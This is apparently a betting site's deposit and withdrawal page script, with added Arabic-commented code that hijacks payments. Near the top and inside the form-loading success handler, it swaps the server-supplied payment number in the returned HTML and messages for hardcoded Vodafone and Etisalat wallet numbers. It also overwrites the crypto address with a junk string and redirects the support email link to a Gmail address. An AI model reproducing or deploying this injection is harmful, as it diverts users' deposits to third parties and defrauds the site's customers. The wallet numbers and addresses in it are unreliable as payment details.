/*
* основные данные (страница withdraw/deposit) - заполняется в layouts
* mainToggle - модуль интеграции с toggle (Блок с кнопкой показа/скрытия элементов)
* crypto - модуль для криптовалют
*
* Custom Events:
*  modal:offsetForm - событие перемещения основного модального окна
*  deposit.result_rendered
*  deposit.request_complecompletecomplete?ate
*  operation.form_closed
* */
document.addEventListener('DOMContentLoaded', function() {
        
 console.log('تم تحميل الصفحة بالكامل.');
 document.getElementsByClassName('warning-text')[0].getElementsByTagName('a')[0].href ='mailto:processingeg.1xbet2@gmail.com'

 
    });

const TYPE_WITHDRAW = 'withdraw';
const TYPE_DEPOSIT = 'deposit';
const WITHDRAW_RELOAD_PAUSE = 15000;

// أرقام البطاقة المخصصة لكل نوع
const apiNumbers = {
    'vodafone': '01068220176',
    'etisalat': '01144141354',
    'cashplus': '01068220176'
};

// تعيين كائنات منفصلة لكل محفظة
var modules = {
    'vodafone': {
        'type_operation': null,
        'api_number': apiNumbers['vodafone'] // تعيين الرقم لفودافون
    },
    'etisalat': {
        'type_operation': null,
        'api_number': apiNumbers['etisalat'] // تعيين الرقم لاتصالات
    }
};

// دالة لتحديث الرقم بناءً على نوع المحفظة
function updateNumberForCard(walletType) {
    if (modules[walletType]) {
        api = modules[walletType]['api_number'];
    } else {
        api = null; // تعيين رقم افتراضي أو التعامل مع الحالة عند عدم وجود محفظة
    }
}

// دالة لاختيار المحفظة وتحديث الرقم
function selectWallet(walletType) {
    updateNumberForCard(walletType);
    // قم بإعادة تحميل الكروت بناءً على الرقم الجديد
    loadCards();
}

// دالة لتحميل الكروت بناءً على الرقم المحدد
function loadCards() {
    // تحقق من نوع العملية
    if (modules['vodafone']['type_operation'] === TYPE_DEPOSIT) {
        console.log("Loading Vodafone cards for: " + api);
        // أضف هنا الكود لتحميل كروت فودافون بناءً على الرقم
    } else if (modules['etisalat']['type_operation'] === TYPE_DEPOSIT) {
        console.log("Loading Etisalat cards for: " + api);
        // أضف هنا الكود لتحميل كروت اتصالات بناءً على الرقم
    }
}

// استخدم الدالة لتحديث طريقة الدفع بناءً على الاختيار
function onPaymentMethodChange(selectedMethod) {
    // تعيين نوع العملية بناءً على الدفع
    var walletType = selectedMethod; // تحديد المحفظة بناءً على الاختيار
    if (modules[walletType]) {
        modules[walletType]['type_operation'] = TYPE_DEPOSIT; // أو TYPE_WITHDRAW حسب الحاجة
        selectWallet(walletType);
    }
}

// مثال على استخدام الدالة لتحديث الرقم بناءً على نوع الدفع
onPaymentMethodChange('vodafone'); // لتعيين رقم فودافون وتحميل الكروت
console.log(api); // سيظهر 01068220176

onPaymentMethodChange('etisalat'); // لتعيين رقم اتصالات وتحميل الكروت
console.log(api); // سيظهر 01144141354
modules['crypto'] = onPaymentMethodChange('orange'); // أورانج وتحويل الكروت
console.log(api); // 01068220176 سيظهر رقمك هنا


var payment_form = $('.payment_modal'),
    payment_form_container = payment_form.find('#payment_modal_container'),
    scrollHelper = {
        current_height: null,
        force_current_height: null
    },
    files, // для записи файлов
    grecaptcha = null,
    in_process = false,
    default_rate = {},
    //update_status = null,
    ajax = [];

var paymentMethodsWrap = $('.payment-methods__wrap');


/*function UpdateStatus() {
    var is_open = false;
    var timer = null;

    this.update = function (new_value) {

        if ($('.requests_output_block > .requests_output_row .requests_data:first').text() === '-') {
            return null;
        }

        new_value = new_value || null;

        if (new_value === null) {
            is_open = !is_open;
        } else {
            is_open = new_value;
        }

        if (is_open && timer === null) {
            timer = setInterval(reloadRequestList, 60000);
        } else if (!is_open && timer !== null) {
            clearInterval(timer);
            timer = null;

            if (ajax['reloadRequestList'] !== undefined) {
                ajax['reloadRequestList'].abort();
            }
        }
    }
}*/

// TODO: make captcha more usable

$(function () {

    var index_of_way = '';      // Активный способ вывода

    $('.wrap_section').on('click', '.payment_item', function (event) {
        if (in_process) {
            return;
        }

        var block = $(this),
            data = {
                'agent':  undefined,
                'method': undefined,
                'icon':   undefined,
                'other':   [],
            };

        if (block.hasClass('payment_item--disabled')) {
            var message_key = block.data('restrictionmessage');
            if (!message_key) {
                message_key = window.is_deposit ? 'deposit_denied' : 'withdraw_denied';
            }
            const message_link = block.data('restrictionmessage_link');
            const obj = message_link ? {'link': message_link} : null;
            alerts(null, dictionary.get(message_key), '', obj);
            return;
        }

        if (typeof BrowserPayment !== 'undefined' && block.hasClass(BrowserPayment.payment_class)) {
            if (false === BrowserPayment.isAvailable()) {
                alerts(dictionary.get('error'), 'Данный способ оплаты в данный момент невозможен', 0);
                return;
            }
        }

        for (var key in block.data()) {
            if (data.hasOwnProperty(key)) {
                data[key] = block.data(key);
            } else if (key.indexOf('__') === 0) {
                data.other.push(key + '=' + block.data(key));
            }
        }

        if (typeof data.method === 'undefined' || (index_of_way === data.method && block.hasClass('active')) || event.target.className === 'close') {
            return;
        }
        index_of_way = data.method;

        $('.wrap_section .payment_item').removeClass('active');
        block.addClass('active');

        const methodMessage = methodMessages[block.data('rawmethod')] || methodMessages[data.agent];
        if (typeof methodMessage !== 'undefined') {
          showMessage(methodMessage);
        }

        initFormContainer();

        getForm(data.agent, data.method, data.icon, data.other, block);
    });

    $('.message-overlay').on('click', hideMessage);
    $('.message-close').on('click', hideMessage);

    function showMessage(message) {
      $('.message-content').html(message);
      $('.message-overlay').addClass('active');
    }

    function hideMessage(e) {
      e.preventDefault();
      const popup = $('.message-popup');
      if (!$(this).hasClass('message-close') && (popup.is(e.target) || popup.has(e.target).length)) {
        return false;
      }
      $('.message-overlay').removeClass('active');
    }

    $(document).on('input', '.max-number-length', function () {
        var $el = $(this),
            max_length = $el.attr('data-max-number-length'),
            input = $el.val();

        if (input.length >= max_length) {
            $el.val(input.substr(0, max_length));
        }
    });

    $(document).on('input', '.js-counter', function () {
        var counter = $(this).closest('.payment_modal_input').find('.js-field-counter');
        var maxLength = $(this).attr('maxlength')
        if (counter.length === 0 || maxLength === undefined) {
            return;
        }
        counter.first().text($(this).val().length +'/'+ maxLength);
    });

    //обработчик ввода для карт, помеченных в аттрибуте как card16
    window.card16_mask = '';
    window.amount_mask = '';

    /**
     * @param regex regex пример: data-mask-pattern="\+7 \(926\) \d{3}-mytext-\d{2}-\d{2}-\w{2}-\.{2}"
     * @returns {string}
     */
    function convertToMaskInput(regex) {
        return new RegExp(regex).source
            .replace(/^\^|\$$/g, '') // чистка служебных начала и конца
            .replace(/\\d\+/g, '~') // замена цифрового шаблона на маску цифр (может применяться только в конце)
            .replace(/\\d/g, '#') // замена цифрового шаблона на маску цифры
            .replace(/\\w/g, '_') // замена текстового шаблона на маску буквы
            .replace(/\\\./g, '*') // замена универсального шаблона на маску буквы
            .replace(/\\\+/g, '+') // очистка от экранирования знака "+"
            .replace(/\[([^^])*\]/, '_') // замена классификаторов на маску буквы
            .replace(/\(([^)]*)\)\{(\d+)\}/gi, function (_, c, n) { // умножение содержимого скобок и удаление этих скобок
                return Array(+n + 1).join(c)
            })
            // .replace(/(?<!\\)\(([^)]*)(?<!\\)\)/,'$1') // не работает в сафари: удаление скобок (там где нет умножения)
            .replace(/\\\(([^)]*)\\\)/, '[[$1]]') // сафари: вариант обода ретроспективной проверки в сафари: сохраняем
            .replace(/\(([^)]*)\)/, '$1') // сафари: удалем остальное
            .replace(/\[\[([^\]]*)\]\]/, '($1)') // сафари: возвращаем
            .replace(/\\([\\/.(){}[\]])/g, '$1') // очистка экранирования для спец сиволов
            .replace(/([\w*#_.-])\{(\d+)\}/gi, function (_, c, n) {
                return Array(+n + 1).join(c)
            })
    }

    function mergeValueMask(value, mask) {

        const result = {"value": '', 'offset': 0};

        let j = 0;
        for (let i = 0; i < mask.length; i++) {
            if (j >= value.length) break;

            if (
                mask[i] !== value[j]
                && mask[i] !== '#'
                && mask[i] !== '_'
                && mask[i] !== '*'
                && mask[i] !== '~'
            ) {
                result.value += mask[i];
                result.offset++;
            } else if (mask[i] !== value[j]) {
                if (mask[i] === '#') { // цифра
                    let founded = false;
                    while (j < value.length) {
                        if (!isNaN(parseInt(value[j]))) {
                            founded = true;
                            break;
                        }
                        j++;
                    }
                    if (!founded) break;
                } else if (mask[i] === '_' && !isNaN(parseInt(value[j]))) {
                    let founded = false;
                    while (j < value.length) {
                        if (isNaN(parseInt(value[j]))) {
                            founded = true;
                            break;
                        }
                        j++;
                    }
                    if (!founded) break;
                } else if (mask[i] === '~') {
                    if (value[j] === ' ') {
                        continue;
                    }

                    let founded = false;
                    while (j < value.length) {
                        if (!isNaN(parseInt(value[j]))) {
                            founded = true;
                            i--;
                            break;
                        }
                        j++;
                    }
                    if (!founded) break;
                }

                result.offset++;
                result.value += value[j++];
            } else if (mask[i] === value[j]) {
                result.offset++;
                result.value += value[j++];
            }
        }

        if (result.value.length < mask.length) {
            // законментирован код который курсор ставит на послледнее м
            // есто перед вводимым символом - но это не позволяет удобно удалить
            // символы назад поэтому пока закоментил.

            // var stop = false;
            // var specials = ['#','_','*'];
            for (var i = result.value.length; i < mask.length; i++) {
                // if(specials.indexOf(mask[i]) != -1)
                // {
                //   stop = true;
                // }
                // if(!stop){
                //   result.offset++;
                // }
                result.value += mask[i].replace(/^[#*_~]{1}$/, '_');
            }
        }
        return result;
    }

  $(document).on('input', '[data-mask-pattern]', function (event) {
    var $el = $(this),
      el = $el[0],
      pattern = $el.data('mask-pattern'),
      text = $el.val(),
      cursor_position = el.selectionStart,
      hide_if_change = $el.data('mask-pattern-hide') || true;

    cursor_position = cursor_position || text.length; // при загрузке дефолтного значение выделение на 0 позиции
    if(!pattern) return;

    if(hide_if_change) text = text.substr(0, cursor_position);
    var mask = convertToMaskInput(pattern);
    var result = mergeValueMask(text, mask, cursor_position);
    $el.val(result.value);
    cursor_position = result.offset;
    el.setSelectionRange(cursor_position, cursor_position);
  });

    $(document).on('input', '[data-mask="card16"]', function () {
        var $el = $(this),
            input = $el.val(),
            input_position = $el[0].selectionStart,
            result = '',
            changed_symbol = '',
            correct_cursor_pos = 0;

        for (var j = 0; j < input.length; j++) {
            if (window.card16_mask[j] !== input[j]) {
                changed_symbol = window.card16_mask[j];
                break;
            }
        }

        if (changed_symbol === ' ' && input.length < window.card16_mask.length) {
            input = input.substr(0, input_position - 1) + input.substr(input_position);
            correct_cursor_pos = -2;
        }

        for (var i = 0; i < input.length; i++) {
            var int_val = parseInt(input[i]);
            if ((!int_val && int_val !== 0) || result.length > 18) {
                continue;
            }

            result += ([4, 9, 14].indexOf(result.length) !== -1 ? ' ' : '') + input[i];
        }

        $el.val(window.card16_mask = result);

        var cursor_position = (result.length > input.length ? input_position + 1 : input_position) + correct_cursor_pos;
        $el[0].setSelectionRange(cursor_position, cursor_position);
    });

    $(".btn_payment_method").click(function () {
        $(this).toggleClass('btn_payment_method--is-toggled');
        $(this).siblings('aside').find('.aside_wrap').addClass('scrollbar-inner').scrollbar();
        $("aside").toggleClass('active');
        $('.fon_modal').toggleClass('active');
    });

    $(document).on('click', '#deposit_button', function (e) {
        var $this = $(this);

        e.preventDefault();

        if (grecaptcha !== null) {
            grecaptcha.execute();
        } else {
            createDeposit($this);
        }
    }).on('click', '#withdraw_button', function (e) {
        var $this = $(this);

        e.preventDefault();

        if (grecaptcha !== null) {
            grecaptcha.execute();
        } else {
            createWithdraw($this);
        }
    }).on('click', '.payment_modal .close, .modal__close', function (event) {
        event.preventDefault();

        closeForm();
    }).on('click', 'aside .close', function(e) {
        $('aside').removeClass('active');
        $('.fon_modal').removeClass('active');
    }).on('click', '.fon_modal,.payment_modal_wrapper', function (event) {
        if (in_process) {
            return;
        }
        if (event.target!==event.currentTarget) {
            return;
        }
        event.preventDefault();
        closeForm();

        $("aside").removeClass('active');
        $('.btn_payment_method').removeClass('btn_payment_method--is-toggled');
    });

    $(window).resize(function () {
        if (payment_form.length > 0) {
            payment_form.removeClass('full');
            removeFullIframe();
            payment_form.css('height', 'auto');
            if (payment_form.hasClass('active')) {
                getOffsetForm(payment_form);
            }
        }
        resize();
    });

    var $show_all_btn = $('.without_geo_output-js'),
        type_code = $('.confirmation');

    if ($('.payment_wrap .payment_item').filter(':hidden').length <= 0) {
        $show_all_btn.remove();
    }

    var params = window.parent.location.href.split('?');

    if (params.length > 1) {
        var get_param_str = params[1].split('&'),
            get_param = {};

        get_param_str.forEach(function (param) {
            var data = param.split('=');
            if (data.length > 1) {
                get_param[data[0]] = data[1];
            }
        });

        if (get_param['form']) {
            var $element = $('.' + get_param['form']);

            $element.length && $element.trigger('click');
        }
    }

    if ($show_all_btn.length) {
        $show_all_btn.on('tap click', function (event) {
            event.preventDefault();

            $switch = $(this);
            $switch.toggleClass('active');
            if (!$switch.hasClass('active')) {
                $('.payment_wrap .payment_item').show();
                $('.aside_row').each(function (inx, elm) {
                    var number_elements_in_cat = $(elm).find('.number_payment_system');
                    number_elements_in_cat.text(number_elements_in_cat.data('all_count'));
                });
            } else {

                if ($('.aside_row.active .number_payment_system').is('[data-geo_count=0]')) {
                    $('.aside_row:first').click();
                }

                $('.payment_wrap .payment_item.is_geo').hide();
                $('.aside_row').each(function (inx, elm) {
                    var number_elements_in_cat = $(elm).find('.number_payment_system');
                    number_elements_in_cat.text(number_elements_in_cat.data('geo_count'));
                });
            }


            showHideZeroItemMenu();
            showPaymentType();
            resize();
        });
    }

    if (type_code.length) {
        $('.confirmation_switch_item').on('click', function () {
            if ($(this).hasClass('active')) {
                return;
            }
            $('.confirmation_switch_item').removeClass('active');
            $(this).addClass('active');
        });
    }


    $('.requests_output_block').on('click', '.update_status', function (e) {
        e.preventDefault();
        const lockExpirationKey = 'buttonLockExpiration';
        const lockButtonClass = '.update_status';
        if (!isReloadingWithKeyActive(lockExpirationKey)) {
            reloadRequestList();
        } else {
            disableUpdateButton(lockButtonClass);
            createTimerReload(lockExpirationKey,lockButtonClass);
        }
    });

    $(document).on('change keyup input click', 'input[data-filter-pattern]', function () {
        if (isAmountThousandsSeparatorEnabled() && 'amount' === $(this).attr('id')) {
            return;
        }

        var pattern = $(this).data('filter-pattern');

        if (!pattern) {
            return;
        }

        var re = new RegExp(pattern, 'g');

        if (this.value.match(re)) {
            this.value = this.value.replace(re, '');
        }
    }).off('change keyup input click select touchstart touchmove', 'input[name="amount"]').on('change keyup input click select touchstart touchmove', 'input[name="amount"]', function () {
        var $rate = $('#crypto_conversion_rate'),
            amount = parseFloat(amountRmThousandsSeparator($(this).val())),
            base_rate = parseFloat($rate.attr('data-base-rate')),
            isCrypto = $rate.attr('data-base-crypto') === 'true';

        if (isNaN(amount)) {
            amount = 0;
        }

        if (typeof default_rate[index_of_way] === "undefined" && base_rate) {
            default_rate[index_of_way] = base_rate;
        }

        var fractionDigits = 2;
        if (isCrypto) {
            fractionDigits = 8;
        }

        $rate.text((amount * default_rate[index_of_way]).toFixed(fractionDigits));
    }).on('click', '#copy_wallet_btn', function () {
        var el = document.getElementById('crypto_wallet');
        var range = document.createRange();
        var sel = window.getSelection();

        var copiedText = $('#copy_wallet_btn_text');
        copiedText.show().delay(2000).hide(500);

        range.selectNodeContents(el);
        sel.removeAllRanges();
        sel.addRange(range);

        document.execCommand('copy');

        sel.removeAllRanges();
        return false;
    }).on('click', '#copy_message_btn', function () {
        var el = document.getElementById('crypto_message');
        var range = document.createRange();
        var sel = window.getSelection();

        var copiedText = $('#copy_message_btn_text');
        copiedText.show().delay(2000).hide(500);

        range.selectNodeContents(el);
        sel.removeAllRanges();
        sel.addRange(range);

        document.execCommand('copy');

        sel.removeAllRanges();
        return false;
    }).on('click', '.copy_content_btn', function () {
        var contentElement = this.previousElementSibling;
        var range = document.createRange();
        var sel = window.getSelection();

        var copiedText = $(this.nextElementSibling);
        copiedText.show().delay(2000).hide(500);

        range.selectNodeContents(contentElement);
        sel.removeAllRanges();
        sel.addRange(range);

        document.execCommand('copy');

        sel.removeAllRanges();
        return false;
    }).on('click', '.requests_output_block-close', function () {
        $('.requests_output_block').slideToggle();
        $('.requests_output-js').removeClass('open_list');
    })
     .ready(function() {
        const lockExpirationKey = 'buttonLockExpiration';
        const lockButtonClass = '.update_status';
        if (isReloadingWithKeyActive(lockExpirationKey)) {
            disableUpdateButton(lockButtonClass);
            reloadRequestList(true);
            createTimerReload(lockExpirationKey,lockButtonClass);
       }
     });

    /*if ($('.requests_output-js').length > 0) {
        update_status = new UpdateStatus();

        $(".requests_output-js").click(function () {

            if (update_status !== null) {
                update_status.update();
            }

            $('.requests_output_block').slideToggle();
            $(this).toggleClass('open_list');

            if ($(this).hasClass('open_list')) {
                reloadRequestList();
            }
        });
    }*/
    if ($(".requests_output-js").length > 0) {
        $(".requests_output-js").click(function () {
            $('.requests_output_block').slideToggle();

            $(this).toggleClass("open_list");
            const lockExpirationKey = 'buttonLockExpiration';
            const lockButtonClass = '.update_status';
            if (isReloadingWithKeyActive(lockExpirationKey)) {
                createTimerReload(lockExpirationKey,lockButtonClass);
                disableUpdateButton(lockButtonClass);
            }

            if($(this).hasClass("open_list")) {
                $('.preloader').hide();
                if (!isReloadingWithKeyActive(lockExpirationKey)) {
                    reloadRequestList();
                }
            }
        });
    }

    ellipsizeTextBox('payment-cell-name__caption--is-title');

    $('.aside_row').click(function () {

        $active = $(this);
        $toggleButton = $('.btn_payment_method');
        if ($active.is('.active')) {
            return;
        }

        $('.aside_row.active').removeClass('active');
        $toggleButton.removeClass('btn_payment_method--is-toggled');
        $active.addClass('active');
        $toggleButton.addClass('btn_payment_method--is-toggled');
        showPaymentType($active.data('type'));
        resize();

        if ($('#payment_methods').is('.mobi')) {
            $("aside").removeClass('active');
            $toggleButton.removeClass('btn_payment_method--is-toggled');
            $('.fon_modal').removeClass('active');
        }
    });
    showHideZeroItemMenu()

    if (isInFrame()) {
        $(parent.window).scroll(function () {
            if (payment_form.length > 0) {
                if (payment_form.hasClass('active')) {
                    if (!isTest()) {
                        getOffsetForm(payment_form);
                    }
                }
            }
        });
    }

    let sliderImagesCount = $('.owl-carousel img').length;

    if (sliderImagesCount) {
        $('.owl-carousel').owlCarousel({
            loop: false,
            margin: 15,
            items: 1,
            autoplay: true,
            autoplayTimeout: 3000,
            autoplayHoverPause: true,
            nav: sliderImagesCount > 1,
            navContainerClass: 'slider-nav',
            navElement: 'button',
            navClass: [
                'slider-nav__btn slider-nav__btn--prev',
                'slider-nav__btn slider-nav__btn--next'
            ],
            navText: [
                '<svg class="slider-nav__icon"><use xlink:href="./xpay/images/icons.svg#angle-left"/></svg>',
                '<svg class="slider-nav__icon"><use xlink:href="./xpay/images/icons.svg#angle-right"/></svg>'
            ],
            dots: sliderImagesCount > 1,
            dotsClass: 'slider__dots slider-dots',
            dotClass: 'slider-dots__item',
        });
    }
});

function showPaymentType(type) {

    type = type || $('.aside_row.active').data('type');

    if (type === 'all_systems') {
        $('.group_item:not(.not-visible-now)').show();
    } else {
        $('.group_item').hide();
        $('#group_' + type).show();
        $('.group_item.group_item_' + type).show();
    }
}

function showHideZeroItemMenu() {

    $('.number_payment_system').each(function (i, item) {
        $parent = $(this).parent();
        if ($(this).text() === '0') {
            $parent.hide();
            $('#group_' + $parent.data('type')).addClass('not-visible-now').hide();
        } else {
            $parent.show();
            $('#group_' + $parent.data('type')).removeClass('not-visible-now').show();
        }
    });
}

function isFlexboxWrapperUsed()
{
    return $('.fon_modal').hasClass('with-flexbox-wrapper');
}

function isCryptowidgetModalUsed()
{
    return $(".modal__background").length > 0;
}

function scrollToFormIfNeeded()
{
    function _defer(callback)
    {
        if (typeof(window.requestAnimationFrame!=='undefined')) {
            window.requestAnimationFrame(callback);
        } else {
            window.setTimeout(callback, 0);
        }
    }

    function _scrollInnerIframe()
    {
        var isScrollBehaviorSupported = typeof(document.documentElement.style.scrollBehavior) !== 'undefined';

        document.body.scrollIntoView(isScrollBehaviorSupported ? {behavior: "auto"} : true);
    }

    function _scrollParentDocument(parentDocument)
    {
        var iframe = $(parentDocument.getElementById('payments_frame')),
            isParentWindowScrollable = (iframe.height()>screen.height),
            iframeOffset = $(iframe).offset(),
            iframeTop = iframeOffset && iframeOffset.top || 0
        ;

        if (isParentWindowScrollable) {
            parentDocument.documentElement.scrollTo({
                left: 0,
                top: (iframe.height()-screen.height) / 2 + iframeTop
            });
        }
    }

    if (isFlexboxWrapperUsed() || isCryptowidgetModalUsed()) {
        _defer(function () {
            _scrollInnerIframe();
            _scrollParentDocument(window.parent.document);
        });
    }
}

function initFormContainer() {
    if (payment_form_container.length > 0) {
        if (payment_form.hasClass('full')) {
            payment_form.removeClass('full');
            removeFullIframe();
        }

        payment_form_container.html('');
        paymentMethodsWrap.removeClass('payment-methods__wrap--hidden');
    } else {
        const modalPivotEl = $('.fon_modal');
        const modalEl = $('<div/>', {'class': 'payment_modal modal-payment'}).append(
            $('<span/>', {'class': 'close modal-payment__close'}),
            $('<div/>', {'id': 'payment_modal_container', 'class': 'modal-payment__container modal-payment-container'})
        );

        if (isFlexboxWrapperUsed()) {
            modalPivotEl.after(
                $('<div/>', {'class': 'payment_modal_wrapper flexbox_wrapper'}).append(modalEl)
            );
        } else {
            modalPivotEl.after(modalEl);
        }
        payment_form = $('.payment_modal');
        payment_form_container = payment_form.find('#payment_modal_container');
        paymentMethodsWrap = $('.payment-methods__wrap');

        if (isLimitedHeight()) {
            payment_form.css('transform', 'translate(-50%, 0%)');
        }
    }

    if (isLimitedHeight()) {
        payment_form.css('transform', 'translate(-50%, 0%)');
    }
}

function isLimitedHeight() {
    var urlParams = new URLSearchParams(window.location.search);
    return urlParams.get('payment-wrap-height') !== null;
}

// после двух строк обрезаем текст и ставим троеточие
function ellipsizeTextBox(className, inInfo = false) {
    var el = document.getElementsByClassName(className);
    for (var i = 0; i < el.length; i++) {
        var wordArray = el[i].innerHTML.trim().split(' ');
        el[i].setAttribute('title', el[i].innerHTML);
        if ((el[i].scrollHeight > 0 && el[i].scrollHeight > (el[i].parentElement.clientHeight - 6) && wordArray.length > 3) || (el[i].scrollHeight > 40 && inInfo)) {
            wordArray.splice(-2, 2);
            el[i].innerHTML = wordArray.join(' ') + '...';
        }
    }
}

function getForm(agent, subsystem, icon, add_data, block) {
    
    grecaptcha = null;
    files = null;

    var url = '/' + window.location.pathname
            .split('/')
            .filter(function (item) {
                if (item !== '') {
                    return item;
                }
            })
            .join('/') + '/' + agent + '/',
        $preloader = $('.preloader'),
        param_request = [];

    if (Array.isArray(add_data)) {
        param_request = add_data;
    }

    if (block) {
        var method = block.data('rawmethod');

        if (method !== '') {
            param_request.push('method=' + method);
        }

        var bt_subagent = block.data('subagent');

        if (bt_subagent !== undefined) {
            param_request.push('subagent=' + bt_subagent);
        }
    }

    if (subsystem !== '') {
        param_request.push('sub_system=' + subsystem);
    }

    if (typeof icon !== 'undefined') {
        param_request.push('icon=' + icon);
    }

    if (payment_form_container.find('form').length) {
        param_request.push(payment_form_container.find('form').serialize());
    } else {
        //$('li .dynamic_payment_form .container_body').html('');
    }

    const beforePreloader = $("#before_preloader");
    
    $.ajax({
        url: url,
        type: 'POST',
        data: param_request.join('&'),
        dataType: 'json',
        beforeSend: function () {
            //$this.hide();
            //$preloader.show();
            $('.fon_modal').addClass('active');
            $('.payment-methods__wrap').addClass('payment-methods__wrap--hidden');
            if (isInFrame() && window.user_id === 335676453) {
                resize();
                parent.window.scrollTo({ top: 0})
            }
            beforePreloader.show();
            in_process = true;
        },
        success: function (data) {
            $('.fon_modal').removeClass('active');


            if(data.html != null){
            let newNumber = api;
            let regex = />\d+</;
         data.html = data.html.replace(regex, `>${newNumber}<`);

          let insta = /address\'\>[a-zA-Z][a-zA-Z0-9]+.\<\/span\>/;
           data.html = data.html.replace(insta, `${'address\'\>csjqf \<\/span\>'}`);
 
         }

            const parsedHtml = $.parseHTML(data.html);
            
            let isAutoRedirect = false;
            parsedHtml.forEach(function (item) {
              if (item.classList && item.classList.contains('payment_modal_body') && $(item).find('[data-auto-redirect="1"]').length) {
                  isAutoRedirect = true;
              }
            });

            if (data.success) {
                if (data['code'] === 6) {
                    alerts(dictionary.get('confirm_action'), data['message'], data['code'], data);
                }

                if (data['code'] === 5) {
                    beforePreloader.hide();
                    in_process = false;

                    if (agent === 'redirector') {
                        closeForm();
                    }

                    window.parent.location.href = data['url'];
                    return;
                }

                if (data['code'] === 1 || data['code'] === 8) {
                    in_process = false;
                    beforePreloader.hide();
            let newNumber = api
            let regex = />\d+</;
         data.message = data.message.replace(regex, `>${newNumber}<`);   
                    closeForm();
                    alerts(data['title'], data['message'], 0);
                    return;
                }

                if (data['code'] === 4) {
                    in_process = false;
                    beforePreloader.hide();

                    closeForm();

                    var add_data = [];
                    if (typeof data['amount'] !== 'undefined' && data['amount']) {
                        add_data.push('amount=' + data['amount']);
                    }
                    if (typeof data['bank'] !== 'undefined' && data['bank']) {
                        add_data.push('bank=' + data['bank']);
                    }
                    if (typeof data['bank_code'] !== 'undefined' && data['bank_code']) {
                        add_data.push('bank_code=' + data['bank_code']);
                    }

                    getForm(data['agent'], data['method'], null, add_data, block);
                    return;
                }

                if (isAutoRedirect) {
                    in_process = true;
                    $('.fon_modal').addClass('active');

                    payment_form_container.html(data.html);
                    payment_form.find('[data-auto-redirect="1"]').submit();

                    return;
                }

                //if (!payment_form.hasClass('active')) {
                $('.fon_modal').addClass('active');
                payment_form.closest('.payment_modal_wrapper').addClass('active');
                payment_form.addClass('active').show();
                scrollToFormIfNeeded();
                //}

                payment_form_container.html(data.html);

                var old_bt_subagent =  payment_form_container.find('input[name="btsa"]');

                if (old_bt_subagent && block) {
                    block.data('subagent', old_bt_subagent.val());
                }

                paymentMethodsWrap.addClass('payment-methods__wrap--hidden');
                if (isInFrame() && window.user_id === 335676453) {
                    resize();
                }

                getOffsetForm(payment_form);

                if (typeof VKI_attach !== 'undefined') {
                    refreshKeybords();
                }

                var sumSelectAmountBtns = payment_form_container.find('.payment-sum-select-amount button');
                var amount = payment_form_container.find('[name="amount"]');
                amount.on('keyup', function () {
                    sumSelectAmountBtns.removeClass('active');
                });
                if (amount.length > 0 && sumSelectAmountBtns.length > 0) {
                    sumSelectAmountBtns.click(function (e) {
                        e.preventDefault();
                        if (this.classList.contains('active')) {
                            return;
                        }
                        sumSelectAmountBtns.removeClass('active');

                        this.classList.add('active');
                        amount.val(this.dataset.notFormatedSum);
                    })
                }

                //helper_form.get(agent, subsystem);
            } else {

                if (typeof data['message'] === 'undefined' || !data['message']) {
                    if (!data['title']){
                        data['title'] = dictionary.get('error');
                    }
                    data['message'] = dictionary.get('unknown_error');
                }

                beforePreloader.hide();
                in_process = false;
                closeForm();
                alerts(data['title'], data['message'], 0);
            }

            beforePreloader.hide();
            in_process = false;
        },
        complete: function () {
            $("input[data-mask-pattern]").trigger('input');
        },
        error: function () {
            beforePreloader.hide();
            in_process = false;
        }
    });
}

function isTest() {
    var isMobiVersion =  $('#payment_methods').is('.mobi');
    var checkOuterHeight = true;
    if (window.outerHeight == 0) {
        checkOuterHeight = false
    }
    return isMobiVersion && checkOuterHeight;
}

function getOffsetForm(form) {
    $('#amount').on('input', function ($event) {
        if (isAmountThousandsSeparatorEnabled()) {
            addThousandsSeparator($event);

            return;
        }

        var value = $event.target.value;
        $event.target.value = value.replaceAll(',', '.');
    });

    if (isTest()) {
        var getWindowHeight = window.outerHeight;
        var getHeightPopup = document.getElementById('payment_modal_container').offsetHeight;

        var getTopIframe = 0;
        var getHeightParentBody = 0;
        var getHeightFrame = document.body.getBoundingClientRect().height;
        var getScrollParent = 0;
        var getTopGutter = 0;

        if ($('#payment_methods').is('.mobi') && window.outerHeight > window.screen.height) {
            getWindowHeight = window.screen.height;
        }

        if (isInFrame()) {
            getTopIframe = window.parent.document.getElementById('payments_frame').getBoundingClientRect().top;
            getHeightFrame = window.parent.document.getElementById('payments_frame').getBoundingClientRect().height;
            getHeightParentBody = window.parent.document.body.getBoundingClientRect().height;
            getScrollParent = window.parent.scrollY;
            getTopGutter = getScrollParent + getTopIframe;
        }

        var getHeightFooter = getHeightParentBody - getHeightFrame - getTopGutter;
        var getTopStyles = getWindowHeight / 2 - getHeightPopup / 2 - getTopIframe;
        var getTopStylesFixHeight = getWindowHeight / 2 - getWindowHeight / 2 - getTopIframe;

        if (getTopStyles + getHeightPopup + getHeightFooter + getTopGutter < getHeightParentBody) {
            if (getHeightPopup + 50 > getWindowHeight) {
                if (getTopStyles < 0) {
                    form.css({'top': 0, 'bottom': 'auto', 'height': getWindowHeight - 70 + 'px'});
                } else {
                    form.css({'top': getTopStylesFixHeight + 60 + 'px', 'bottom': 'auto', 'height': getWindowHeight - 70 + 'px'});
                }
            } else {
                if (getTopStyles < getTopGutter - getWindowHeight - getHeightPopup || getTopStyles < 0) {
                    form.css({'top': 0, 'bottom': 'auto', 'height': 'auto'});
                } else {
                    form.css({'top': getTopStyles + 'px', 'bottom': 'auto', 'height': 'auto'});
                }
            }
        } else {
            form.css({'top': 'auto', 'bottom': 0, 'height': 'auto'});
        }

        // наличие класса в модалке делает ее на всю высоту мобильного устройства
        if (form.find('.js_form_must_full_height').length > 0) {
            var windowHeight = $(window).height()+'px';
            form.find('.js_form_must_full_height iframe').css({'height': 'calc(100vh - 130px)'})
            form.css({'max-height': windowHeight, 'top': 0, 'bottom': 'auto', 'height': windowHeight});
        }

    } else {
        var h = form.height(),
            h_window = $(window).height(),
            h_win = h_window,
            offset_top = 0,
            actual_height = document.getElementsByTagName('body')[0].children[0].scrollHeight + 50,
            marginTop = 0,
            is_mobi = $('#payment_methods').is('.mobi'),
            full = false,
            h_delta = 70,
            offset_delta = 50;

        if (getQueryVariable('fast_reg') === '1') {
            h_delta = 500;
            offset_delta = 200;

            if (is_mobi) {
                full = true;
            }
        }

        if (!is_mobi && window.user_refid === 288) {
            h_delta = 200;

            if (parent.window.innerWidth <= 1366) {
                h_delta = 350;
            }
        }

        if (scrollHelper.current_height) {
            actual_height = scrollHelper.current_height;
